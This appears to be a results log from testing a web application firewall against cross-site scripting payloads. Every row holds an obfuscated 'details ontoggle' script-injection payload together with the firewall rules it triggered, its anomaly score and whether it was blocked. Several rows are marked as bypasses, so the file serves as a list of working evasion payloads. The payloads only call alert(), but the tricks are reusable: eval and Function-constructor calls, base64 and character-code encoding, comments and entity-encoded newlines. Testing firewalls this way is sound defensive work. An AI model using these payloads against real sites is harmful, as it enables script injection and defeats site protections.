447,"<details open ontoggle=""(function(){with(this){eval(unescape('%61%6c%65%72%74%28%31%29'))}})()"">",0,1,block,7,"932100,933160,934100,934100,941100,941120,949110","o46,5v217,96 || o47,47v217,96 || o25,11v217,96 || o25,11v217,96t:urlDecodeUni || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603349065.374441
449,"<details open ontoggle=""(function(){with(this){top['ev'+'al']('al'+'ert(1)')}})()"">",0,1,block,8,"932105,933210,934100,934100,941100,941120,941370,949110","o46,4v217,83 || o24,57v217,83t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,83 || o25,11v217,83t:urlDecodeUni || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,20v217,83t:urlDecodeUni,t:compressWhitespace || ",35,177603349268.236899
450,"<details open ontoggle=""(function(){with(this){(1,eval)('al'+'ert(1)')}})()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,51v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,77 || o25,11v217,77t:urlDecodeUni || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603349345.089191
453,"<details open ontoggle=""(function(){with(this){eval(String['fromCharCode'](97,108,101,114,116,40,49,41))}})()"">",0,1,block,8,"932100,933160,933210,934100,941100,941120,941370,949110","o46,5v217,111 || o47,62v217,111 || o24,85v217,111t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,111 || v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,33v217,111t:urlDecodeUni,t:compressWhitespace || ",35,177603349665.476041
454,"<details open ontoggle=""(function(){with(this){setTimeout('al'+'ert(1)',0)}})()"">",0,1,block,5,"934100,934100,941100,941120,949110","o25,11v217,81 || o25,11v217,81t:urlDecodeUni || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603349799.283766
456,"<details open ontoggle=""(function(){with(this){eval(['al','ert(1)']['join'](''))}})()"">",0,1,block,8,"932100,933160,933210,934100,941100,941120,941370,949110","o46,5v217,87 || o47,38v217,87 || o62,23v217,87t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,87 || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,26v217,87t:urlDecodeUni,t:compressWhitespace || ",35,177603349817.996941
460,"<details open ontoggle=""(new Function('al'+'ert(1)'))()""></details>",0,1,block,5,"934100,934100,941100,941120,949110","o25,13v217,67 || o25,13v217,67t:urlDecodeUni || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17760335020.400250
461,"<details open ontoggle=""(Function('al'+'ert(1)'))()""></details>",0,1,bypass,2,"941100,941120","v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603350372.522824
465,"<details open ontoggle=""(new(Function)('al'+'ert(1)'))()""></details>",0,1,block,4,"933210,941100,941120,949110","o24,32v217,68t:urlDecode,t:replaceComments,t:compressWhitespace || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603350768.569272
466,"<details open ontoggle=""(new/**/Function('al'+'ert(1)'))()""></details>",0,1,bypass,2,"941100,941120","v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603350840.975683
468,"<details open ontoggle=""(new Function(atob('YWxlcnQoMSk')))()""></details>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,73 || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760335107.955955
469,"<details open ontoggle=""(new Function(String.fromCharCode(97,108,101,114,116,40,49,41)))()""></details>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,102 || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760335112.413211
470,"<details open ontoggle=""(new Function('al\x65rt(1)'))()""></details>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,67 || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603351229.204768
471,"<details open ontoggle=""(new Function('al\u0065rt(1)'))()""></details>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,69 || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603351326.273822
472,"<details open ontoggle=""(new	Function	(	'al'	+	'ert(1)'	)	)	(	)""></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,37v217,75t:urlDecode,t:replaceComments,t:compressWhitespace || o25,14v217,75 || o25,14v217,75t:urlDecodeUni || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603351443.074527
473,"<details open ontoggle=""(new&#10;Function&#10;('al'+'ert(1)'))()""></details>",0,1,bypass,2,"941100,941120","v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603351529.927275
475,"<details open ontoggle=""(new Function(['al','ert(1)'].join('')))()""></details>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,78 || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603351668.066210
477,"<details open ontoggle=""(new self['Function']('al'+'ert(1)'))()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o24,39v217,75t:urlDecode,t:replaceComments,t:compressWhitespace || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,16v217,75t:urlDecodeUni,t:compressWhitespace || ",20,177603351891.580984
478,"<details open ontoggle=""(new top['Function']('al'+'ert(1)'))()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o24,38v217,74t:urlDecode,t:replaceComments,t:compressWhitespace || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,15v217,74t:urlDecodeUni,t:compressWhitespace || ",20,177603351970.693695
479,"<details open ontoggle=""(new parent['Function']('al'+'ert(1)'))()""></details>",0,1,block,4,"933210,941100,941120,949110","o24,41v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603352050.058931
480,"<details open ontoggle=""(new Function('al'+'ert(2)'))()"">",0,1,block,5,"934100,934100,941100,941120,949110","o25,13v217,57 || o25,13v217,57t:urlDecodeUni || v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17760335211.691072
481,"<details open ontoggle=""(new Function('aler'+'t(3)'))()"">",0,1,block,5,"934100,934100,941100,941120,949110","o25,13v217,57 || o25,13v217,57t:urlDecodeUni || v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603352295.934321
482,"<details open ontoggle=""(new Function('prompt'+'(4)'))()"">",0,1,block,5,"934100,934100,941100,941120,949110","o25,13v217,58 || o25,13v217,58t:urlDecodeUni || v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603352313.340578
484,"<details open ontoggle=""(new Function(String.fromCharCode(97,108,101,114,116,40,54,41)))()"">",0,1,block,4,"934100,941100,941120,949110","o25,13v217,92 || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760335252.315996
485,"<details open ontoggle=""(Function['constr'+'uctor']('ale'+'rt(7)'))()"">",0,1,block,4,"933210,941100,941120,949110","o24,45v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603352662.990667
486,"<details open ontoggle=""([]['constructor']['constructor']('ale'+'rt(8)'))()"">",0,1,block,4,"933210,941100,941120,949110","o24,51v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603352768.433749
491,"<details open ontoggle=""(new Function(atob('YWxlcnQoMTMp')))()"">",0,1,block,4,"934100,941100,941120,949110","o25,13v217,64 || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603353242.883936
492,"<details open ontoggle=""(new Function('al\u0065rt(14)'))()"">",0,1,block,4,"934100,941100,941120,949110","o25,13v217,60 || v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760335335.446936
493,"<details open ontoggle=""(new Function('al\x65rt(15)'))()"">",0,1,block,4,"934100,941100,941120,949110","o25,13v216,58 || v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603353436.049985
494,"<details open ontoggle=""(new/**/Function('ale'+'rt(16)'))()"">",0,1,bypass,2,"941100,941120","v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603353588.503648
496,"<details open ontoggle=""(new&#10;Function('ale'+'rt(18)'))()"">",0,1,bypass,2,"941100,941120","v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603353737.371981
497,"<details open ontoggle=""([]['find']['constructor']('ale'+'rt(19)'))()"">",0,1,block,4,"933210,941100,941120,949110","o24,45v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603353883.947025
498,"<details open ontoggle=""(''['sub']['constructor']('ale'+'rt(20)'))()"">",0,1,block,4,"933210,941100,941120,949110","o24,44v217,70t:urlDecode,t:replaceComments,t:compressWhitespace || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760335394.425340
499,"<details open ontoggle=""(new Function('eva'+'l(String.fromCharCode(97,108,101,114,116,40,50,49,41))'))()"">",0,1,block,5,"934100,934100,941100,941120,949110","o25,13v217,106 || o25,13v217,106t:urlDecodeUni || v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603354024.719406
505,"<details open ontoggle=""(function(){}.constructor.constructor('ale'+'rt(1)')())""></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,55v217,91t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,91 || o25,11v217,91t:urlDecodeUni || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603354650.541522
508,"<details open ontoggle=""(new Function(atob('YWxlcnQoMSk=')))()""></details>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,74 || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603354951.161972
515,"<details open ontoggle=""(new Function(['ale','rt(1)'].join('')))()""></details>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,78 || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603355610.122144
517,"<details open ontoggle=""(new Function('retur\u006e\u0020alert'))()(1)""></details>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,81 || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760335582.128314
520,"<details open ontoggle=""(new Function('return al'+'ert'))()('XSS')""></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,42v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,78 || o25,13v217,78t:urlDecodeUni || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603356182.058642
521,"<details open ontoggle=""(Function.constructor('al'+'ert(1)'))()""></details>",0,1,bypass,2,"941100,941120","v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603356218.868328
529,"<details open ontoggle=""(new Function('retur'+'n al'+'ert'))()('XSS')""></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,45v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,81 || o25,13v217,81t:urlDecodeUni || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603357036.256447
530,"<details open ontoggle=""(Function['constructor']('al'+'ert(1)'))()""></details>",0,1,block,4,"933210,941100,941120,949110","o24,42v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603357154.239310
531,"<details open ontoggle=""(top['Function']('al'+'ert(1)'))()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o24,34v217,70t:urlDecode,t:replaceComments,t:compressWhitespace || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,15v217,70t:urlDecodeUni,t:compressWhitespace || ",20,177603357299.637502
532,"<details open ontoggle=""(self['Function']['constructor']('al'+'ert(1)'))()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o24,50v217,86t:urlDecode,t:replaceComments,t:compressWhitespace || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,16v217,86t:urlDecodeUni,t:compressWhitespace || ",20,177603357372.960157
536,"<details open ontoggle=""(new parent.Function('return al'+'ert'))()('XSS')""></details>",0,1,block,4,"933210,941100,941120,949110","o24,49v217,85t:urlDecode,t:replaceComments,t:compressWhitespace || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603357763.166166
538,"<details open ontoggle=""(new/**/Function/**/('return al'+'ert'))()('XSS')""></details>",0,1,block,4,"933210,941100,941120,949110","o24,43v217,85t:urlDecode,t:replaceComments,t:compressWhitespace || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603357977.190785
539,"<details open ontoggle=""(globalThis['Function']('al'+'ert(1)'))()""></details>",0,1,block,4,"933210,941100,941120,949110","o24,41v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603358034.015290
540,"<details open ontoggle=""(new Function('return al'+'ert')).call()(2)"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,43v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,69 || o25,13v217,69t:urlDecodeUni || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603358111.897656
543,"<details open ontoggle=""(new Function('retur'+'n al'+'ert')).call()(2)"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,46v217,72t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,72 || o25,13v217,72t:urlDecodeUni || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603358457.214925
544,"<details open ontoggle=""(new Function(String.fromCharCode(114,101,116,117,114,110,32,97,108,101,114,116))).call()(2)"">",0,1,block,4,"934100,941100,941120,949110","o25,13v217,118 || v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603358510.974194
545,"<details open ontoggle=""(new Function('return\u0020al'+'ert')).call()(2)"">",0,1,block,5,"934100,934100,941100,941120,949110","o25,13v217,74 || o25,13v217,74t:urlDecodeUni || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603358640.906149
546,"<details open ontoggle=""(new Function('return\tal'+'ert')).call()(2)"">",0,1,block,5,"934100,934100,941100,941120,949110","o25,13v217,70 || o25,13v217,70t:urlDecodeUni || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603358652.900920
547,"<details open ontoggle=""(new Function('return al'+'\u0065rt')).call()(2)"">",0,1,block,5,"934100,934100,941100,941120,949110","o25,13v217,74 || o25,13v217,74t:urlDecodeUni || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603358720.921292
548,"<details open ontoggle=""(new(Function)('return al'+'ert')).call()(2)"">",0,1,block,4,"933210,941100,941120,949110","o24,44v217,70t:urlDecode,t:replaceComments,t:compressWhitespace || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603358869.305148
549,"<details open ontoggle=""(new[Function][0]('return al'+'ert')).call()(2)"">",0,1,block,4,"933210,941100,941120,949110","o24,47v217,73t:urlDecode,t:replaceComments,t:compressWhitespace || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603358960.902173
550,"<details open ontoggle=""(new Function(['return',' al','ert'].join(''))).call()(2)"">",0,1,block,5,"933210,934100,941100,941120,949110","o65,16v217,83t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,83 || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603359043.640218
552,"<details open ontoggle=""(new Function('return al'+'\145rt')).call()(2)"">",0,1,block,5,"934100,934100,941100,941120,949110","o25,13v217,72 || o25,13v217,72t:urlDecodeUni || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603359222.064868
553,"<details open ontoggle=""(new Function(atob('cmV0dXJuIGFsZXJ0'))).call()(2)"">",0,1,block,5,"933210,934100,941100,941120,949110","o24,50v217,76t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,76 || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603359355.083150
554,"<details open ontoggle=""(new Function('return '+'al'+'ert')).call()(2)"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,46v217,72t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,72 || o25,13v217,72t:urlDecodeUni || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603359418.428242
555,"<details open ontoggle=""(new Function('return\x20al'+'ert')).call()(2)"">",0,1,block,5,"934100,934100,941100,941120,949110","o25,13v217,72 || o25,13v217,72t:urlDecodeUni || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603359541.940768
556,"<details open ontoggle=""(new Function('return al'+'e'+'rt')).call()(2)"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,46v217,72t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,72 || o25,13v217,72t:urlDecodeUni || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603359643.753447
557,"<details open ontoggle=""(new Function(['ret','urn al','ert'].join(''))).call()(2)"">",0,1,block,5,"933210,934100,941100,941120,949110","o65,16v217,83t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,83 || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603359795.378545
